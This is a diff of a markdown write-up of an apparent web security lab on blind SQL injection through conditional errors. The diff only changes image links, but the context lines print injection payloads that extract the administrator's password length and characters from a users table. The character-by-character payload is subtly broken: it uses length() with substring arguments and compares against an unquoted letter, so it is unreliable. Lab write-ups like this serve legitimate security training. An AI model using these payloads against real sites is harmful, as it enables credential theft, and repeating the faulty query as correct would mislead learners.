@@ -30,9 +30,9 @@ Next we gonna see the length of the password. Send the target to Intruder and lo
 
 `ZDhTYBxTuioKS1t5'||(select case when (length(password) > 1) then to_char(1/0) else '' end from users where username='administrator')||'`
 
-![]()
+![](..//Exploiting%20blind%20SQL%20injection%20by%20triggering%20conditional%20responses/img/5.png)
 
-![]()
+![](../Exploiting%20blind%20SQL%20injection%20by%20triggering%20conditional%20responses/img/7.png)
 
 We can see the length is different, because it does not respond the `Error` message.
 
@@ -40,9 +40,7 @@ After that, we will discover character-by-character for the password.
 
 `ZDhTYBxTuioKS1t5'||(select case when (length(password,1,1) = a) then to_char(1/0) else '' end from users where username='administrator')||'`
 
-![]()
-
-![]()
+![](../Exploiting%20blind%20SQL%20injection%20by%20triggering%20conditional%20responses/img/4.png)
 
 ![](img/1.png)
 
